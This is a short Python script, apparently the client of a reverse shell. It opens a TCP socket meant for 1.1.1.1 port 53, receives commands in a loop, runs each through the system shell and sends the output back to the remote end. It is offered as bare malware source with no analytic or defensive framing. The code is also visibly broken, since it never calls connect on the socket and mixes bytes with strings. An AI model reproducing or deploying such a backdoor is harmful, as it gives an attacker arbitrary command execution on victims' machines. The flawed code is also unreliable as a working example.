
import socket
import subprocess


address = ('1.1.1.1', 53)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect():
    while True: 
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break 
        
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

if __name__ == '__main__':
    connect()
            